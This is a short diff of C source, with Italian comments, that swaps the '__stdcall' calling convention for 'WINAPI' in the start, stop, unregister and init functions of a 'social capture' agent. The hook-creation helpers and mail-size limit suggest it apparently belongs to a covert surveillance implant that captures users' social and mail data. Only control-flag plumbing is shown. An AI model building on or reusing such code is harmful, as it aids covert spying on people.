@@ -16,8 +16,8 @@ BOOL social_is_host_started = FALSE; // Indica se il processo host del thread so
 
 #define DEFAULT_MAX_MAIL_SIZE (1024*100)
 
-typedef void (__stdcall *Social_MainLoop_t) (void);
-typedef void (__stdcall *ExitProcess_T) (UINT);
+typedef void (WINAPI *Social_MainLoop_t) (void);
+typedef void (WINAPI *ExitProcess_T) (UINT);
 
 typedef struct {
 	HMCommonDataStruct pCommon;     // Necessario per usare HM_sCreateHookA. Definisce anche le funzioni come LoadLibrary
@@ -149,7 +149,7 @@ void StartSocialCapture()
 	social_is_host_started = TRUE;
 }
 
-DWORD __stdcall PM_SocialAgentStartStop(BOOL bStartFlag, BOOL bReset)
+DWORD WINAPI PM_SocialAgentStartStop(BOOL bStartFlag, BOOL bReset)
 {	
 	if (bStartFlag) 
 		shared.social_process_control = SOCIAL_PROCESS_CONTINUE;
@@ -159,13 +159,13 @@ DWORD __stdcall PM_SocialAgentStartStop(BOOL bStartFlag, BOOL bReset)
 	return 1;
 }
 
-DWORD __stdcall PM_SocialAgentUnregister()
+DWORD WINAPI PM_SocialAgentUnregister()
 {
 	shared.social_process_control = SOCIAL_PROCESS_EXIT;
 	return 1;
 }
 
-DWORD __stdcall PM_SocialAgentInit(JSONObject elem)
+DWORD WINAPI PM_SocialAgentInit(JSONObject elem)
 {
 	// Segnala l'agent manager che questo agente e' sempre attivo. In questo modo verro' PM_SocialAgentStartStop verra' 
 	// chiamata quando sara' necessario mettere in pausa l'agente
